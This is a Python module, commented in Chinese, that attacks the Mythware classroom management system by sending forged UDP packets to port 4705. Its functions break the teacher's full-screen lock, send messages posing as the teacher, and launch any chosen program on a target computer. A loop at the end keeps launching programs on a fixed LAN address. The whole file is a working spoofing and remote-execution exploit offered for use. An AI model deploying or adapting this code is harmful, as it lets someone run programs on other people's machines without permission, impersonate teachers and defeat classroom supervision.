"""
Mythware极域课堂管理系统对抗模块
提供反全屏、发送教师消息和启动应用程序等功能
通过发送特定格式的UDP数据包与极域系统进行交互

Powered by Coco
Thank you!
————wyx6669036
"""
import socket
import struct
import time
import ctypes
from packages import UtilsManager as utils
from packages.utils.Exceptions import NetworkException, ValidationException

TARGET_PORT = 4705


def anti_full_screen(target_ip, target_port=TARGET_PORT):
    """
    发送反全屏数据包到指定IP
    
    参数:
        target_ip (str): 目标IP地址
        target_port (int): 目标端口，默认为4705
        
    返回:
        None
        
    异常:
        ValidationException: 当IP地址无效时抛出异常
        NetworkException: 当发送数据包失败时抛出异常
    """
    # 验证IP地址
    if not target_ip or not isinstance(target_ip, str):
        raise ValidationException("Invalid IP address", field_name="target_ip", field_value=target_ip)
    
    # 创建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 嗯抓包抓到的嗯对
    payload = bytearray([
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00,
        0x01, 0x00, 0xc6, 0x00, 0x00, 0x00, 0x1a, 0x8f, 0xd9, 0xc3, 0x60, 0xad, 0x07, 0x41, 0xac, 0xf0,
        0xc0, 0xfb, 0x12, 0x7d, 0x06, 0x1d, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x99, 0x81, 0xb9, 0x00,
        0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x20, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
        0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x11, 0x2b, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x5e, 0x01, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x02, 0x00,
        0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0xa0, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x19, 0x00,
        0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0xa8, 0x99, 0x81, 0x04, 0x00,
        0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x03,
        0xe0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6e, 0x00

    ])

    # 修改第19字节为GetTickCount()低8位
    payload[19] = ctypes.windll.kernel32.GetTickCount() & 0xFF

    # 目标地址和端口
    target_addr = (target_ip, target_port)

    try:
        # 发送数据包
        sock.sendto(payload, target_addr)
        utils.info(f"[+] Sent to {target_ip}:{target_port} (anti_full_screen)")
    except socket.error as e:
        utils.error(f"[-] Network error sending to {target_ip}: {e}", e)
        raise NetworkException(f"Failed to send anti_full_screen packet to {target_ip}:{target_port}", 
                              target_ip=target_ip, target_port=target_port) from e
    except Exception as e:
        utils.error(f"[-] Unexpected error sending to {target_ip}: {e}", e)
        raise NetworkException(f"Unexpected error sending anti_full_screen packet to {target_ip}:{target_port}", 
                              target_ip=target_ip, target_port=target_port) from e
    finally:
        sock.close()

def send_teacher_message(text, target_ip, target_port=TARGET_PORT):
    """
    以老师身份发送消息到指定IP
    
    参数:
        text (str): 要发送的消息内容
        target_ip (str): 目标IP地址
        target_port (int): 目标端口，默认为4705
        
    返回:
        None
        
    异常:
        ValidationException: 当参数无效时抛出异常
        ValueError: 当数据包长度不为954字节时抛出异常
        NetworkException: 当发送数据包失败时抛出异常
    """
    # 验证输入参数
    if not text or not isinstance(text, str):
        raise ValidationException("Invalid message text", field_name="text", field_value=text)
    if not target_ip or not isinstance(target_ip, str):
        raise ValidationException("Invalid IP address", field_name="target_ip", field_value=target_ip)
    
    # 创建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 神秘数据包:)
    header = bytearray([
        0x44,0x4d,0x4f,0x43,0x00,0x00,
        0x01,0x00,0x9e,0x03,0x00,0x00,0xac,0x31,0x67,0xfc,0x4c,0x74,0x11,0x4d,0xa7,0x42,
        0x60,0x84,0xf9,0x3e,0x40,0x3c,0x20,0x4e,0x00,0x00,0xc0,0xa8,0x99,0x81,0x91,0x03,
        0x00,0x00,0x91,0x03,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00,
        0x00,0x00
    ])
    tail = bytearray([
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x0a,0x00
    ])
    max_middle_length = 954 - len(header) - len(tail)

    
    middle_data = bytearray()
    for char in text:
        # 获取字符的Unicode编码
        unicode_code = ord(char)
            
        # 将Unicode编码拆分为高位和低位字节
        high_byte = (unicode_code >> 8) & 0xFF
        low_byte = unicode_code & 0xFF
            
        # 调换位置：先写入低位字节，再写入高位字节
        middle_data.append(low_byte)
        middle_data.append(high_byte)
        
    # 如果中间数据长度不足，用0x00填充
    if len(middle_data) < max_middle_length:
        padding_length = max_middle_length - len(middle_data)
        middle_data.extend([0x00] * padding_length)
    # 如果超过最大长度，截断
    elif len(middle_data) > max_middle_length:
        middle_data = middle_data[:max_middle_length]
        
    # 组合完整的数据包
    payload = header + middle_data + tail
        
    # 验证数据包长度
    if len(payload) != 954:
        error_msg = f"pack lenth err: lenth{len(payload)}，should be 954"
        utils.error(f"[-] {error_msg}")
        raise ValueError(error_msg)
    
    
    # 修改第19字节为GetTickCount()低8位
    payload[19] = ctypes.windll.kernel32.GetTickCount() & 0xFF

    # 目标地址和端口
    target_addr = (target_ip, target_port)

    try:
        # 发送数据包
        sock.sendto(payload, target_addr)
        utils.info(f"[+] Sent to {target_ip}:{target_port} (send_teacher_message)")
    except socket.error as e:
        utils.error(f"[-] Network error sending to {target_ip}: {e}", e)
        raise NetworkException(f"Failed to send teacher message to {target_ip}:{target_port}", 
                              target_ip=target_ip, target_port=target_port) from e
    except Exception as e:
        utils.error(f"[-] Unexpected error sending to {target_ip}: {e}", e)
        raise NetworkException(f"Unexpected error sending teacher message to {target_ip}:{target_port}", 
                              target_ip=target_ip, target_port=target_port) from e
    finally:
        sock.close()

def start_applicaion(path, target_ip, target_port=TARGET_PORT):
    """
    以老师身份在目标机器上打开指定程序
    
    参数:
        path (str): 要启动的程序路径，使用单斜杠，如C:\Windows\system32\bbb.exe
        target_ip (str): 目标IP地址
        target_port (int): 目标端口，默认为4705
        
    返回:
        None
        
    异常:
        ValidationException: 当参数无效时抛出异常
        ValueError: 当数据包长度不为906字节时抛出异常
        NetworkException: 当发送数据包失败时抛出异常
        
    注意:
        path参数应使用单斜杠格式，例如C:\Windows\system32\bbb.exe
    """
    # 验证输入参数
    if not path or not isinstance(path, str):
        raise ValidationException("Invalid application path", field_name="path", field_value=path)
    if not target_ip or not isinstance(target_ip, str):
        raise ValidationException("Invalid IP address", field_name="target_ip", field_value=target_ip)
    
    # 创建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # 数据包。
    header = bytearray([
        0x44,0x4d,0x4f,0x43,0x00,0x00,
        0x01,0x00,0x6e,0x03,0x00,0x00,0x2b,0xca,0x3d,0xda,0xe1,0x61,0x63,0x4c,0x94,0x92,
        0xc9,0x01,0xd4,0x26,0xac,0xe4,0x20,0x4e,0x00,0x00,0xc0,0xa8,0x99,0x81,0x61,0x03,
        0x00,0x00,0x61,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,
        0x00,0x00,0x01,0x00,0x00,0x00
    ])
    max_middle_length = 906 - len(header)


    middle_data = bytearray(path.encode('utf-16-le'))
        
    # 如果中间数据长度不足，用0x00填充
    if len(middle_data) < max_middle_length:
        padding_length = max_middle_length - len(middle_data)
        middle_data.extend([0x00] * padding_length)
    # 如果超过最大长度，截断
    elif len(middle_data) > max_middle_length:
        middle_data = middle_data[:max_middle_length]
        
    # 组合完整的数据包
    payload = header + middle_data


    # 验证数据包长度
    if len(payload) != 906:
        error_msg = f"pack lenth err: lenth{len(payload)}，should be 906"
        utils.error(f"[-] {error_msg}")
        raise ValueError(error_msg)
    
    
    # 修改第19字节为GetTickCount()低8位
    payload[19] = ctypes.windll.kernel32.GetTickCount() & 0xFF

    # 目标地址和端口
    target_addr = (target_ip, target_port)

    try:
        # 发送数据包
        sock.sendto(payload, target_addr)
        utils.info(f"[+] Sent to {target_ip}:{target_port} (start_application)")
    except socket.error as e:
        utils.error(f"[-] Network error sending to {target_ip}: {e}", e)
        raise NetworkException(f"Failed to start application on {target_ip}:{target_port}", 
                              target_ip=target_ip, target_port=target_port) from e
    except Exception as e:
        utils.error(f"[-] Unexpected error sending to {target_ip}: {e}", e)
        raise NetworkException(f"Unexpected error starting application on {target_ip}:{target_port}", 
                              target_ip=target_ip, target_port=target_port) from e
    finally:
        sock.close()


if __name__ == "__main__":
    while 1:
        start_applicaion(input("path: "),"192.168.153.130")
